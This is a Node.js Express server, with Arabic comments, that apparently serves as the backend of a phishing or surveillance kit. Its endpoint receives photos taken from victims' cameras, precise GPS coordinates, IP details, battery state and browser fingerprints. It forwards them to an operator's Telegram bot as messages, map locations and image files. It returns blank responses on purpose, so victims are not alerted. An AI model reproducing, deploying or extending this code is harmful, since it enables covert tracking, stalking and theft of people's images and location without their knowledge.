const express = require('express');
const bodyParser = require('body-parser');
const UAParser = require('ua-parser-js');
const axios = require('axios');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.use(bodyParser.json({ limit: '10mb' }));

app.post('/submitData', async (req, res) => {
    try {
        const { chatId, imageDatas, location, permissions, ipInfo, battery } = req.body;

        const userAgent = req.headers['user-agent'] || '';
        const parser = new UAParser(userAgent);
        const browser = parser.getBrowser();
        const os = parser.getOS();
        const device = parser.getDevice();
        const engine = parser.getEngine();

        const browserName = browser.name || 'غير معروف';
        const browserVersion = browser.version ? ` ${browser.version}` : '';
        const osName = os.name || '';
        const osVersion = os.version ? ` ${os.version}` : '';
        const deviceVendor = device.vendor ? ` (${device.vendor})` : '';
        const deviceModel = device.model ? ` ${device.model}` : '';
        const engineName = engine.name ? ` (محرك: ${engine.name})` : '';

        let detailedBrowser = `${browserName}${browserVersion}`;
        if (osName) detailedBrowser += ` - ${osName}${osVersion}`;
        if (deviceVendor || deviceModel) detailedBrowser += ` على${deviceVendor}${deviceModel}`;
        detailedBrowser += engineName;

        let latitude = null;
        let longitude = null;
        let locationText = location || 'غير متاح';

        if (location && location.startsWith('Lat:') && location.includes('Long:')) {
            const latMatch = location.match(/Lat:\s*([\d.-]+)/);
            const longMatch = location.match(/Long:\s*([\d.-]+)/);
            if (latMatch && longMatch) {
                latitude = parseFloat(latMatch[1]);
                longitude = parseFloat(longMatch[1]);
                locationText = `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
            }
        }

        const text = `📱 **بيانات جديدة من المستخدم**
        
🆔 **Chat ID**: ${chatId || 'غير موجود'}
📍 **الموقع الدقيق**: ${locationText}
🔐 **الصلاحيات**: ${permissions || 'غير محددة'}
🌐 **معلومات IP**: ${ipInfo || 'غير متوفرة'}
🔋 **حالة البطارية**: ${battery || 'غير معروفة'}
🌍 **المتصفح الدقيق**: ${detailedBrowser}
🖥️ **User-Agent الخام**: ${userAgent}
        `;

        const botToken = process.env.to;
        const chatIdTelegram = process.env.id || chatId;

        if (!botToken) {
            console.error('❌ BOT_TOKEN غير مضبوط');
            return res.sendStatus(500);
        }

        // 1. إرسال الرسالة النصية
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatIdTelegram,
            text: text,
            parse_mode: 'Markdown'
        });

        // 2. إرسال الموقع كخريطة
        if (latitude !== null && longitude !== null) {
            await axios.post(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                chat_id: chatIdTelegram,
                latitude: latitude,
                longitude: longitude
            });
        }

        // 3. إرسال الصور
        if (imageDatas) {
            const imagesArray = imageDatas.split(',').filter(img => img.trim() !== '');
            for (let i = 0; i < imagesArray.length; i++) {
                const imgBase64 = imagesArray[i];
                const buffer = Buffer.from(imgBase64, 'base64');
                const form = new FormData();
                form.append('chat_id', chatIdTelegram);
                form.append('document', buffer, {
                    filename: `image_${i+1}.jpg`,
                    contentType: 'image/jpeg',
                });

                await axios.post(`https://api.telegram.org/bot${botToken}/sendDocument`, form, {
                    headers: form.getHeaders(),
                    maxBodyLength: Infinity,
                });
            }
        }

        // ✅ إرجاع استجابة فارغة (بدون أي رسائل توجيه)
        res.sendStatus(200);

    } catch (error) {
        console.error('❌ حدث خطأ:', error.message);
        // إرجاع استجابة فارغة حتى في حالة الخطأ (لا نريد توجيه المستخدم)
        res.sendStatus(500);
    }
});

app.get('/', (req, res) => {
    res.send('✅ الخادم يعمل');
});

app.listen(PORT, () => {
    console.log(`🚀 الخادم يعمل على المنفذ ${PORT}`);
});
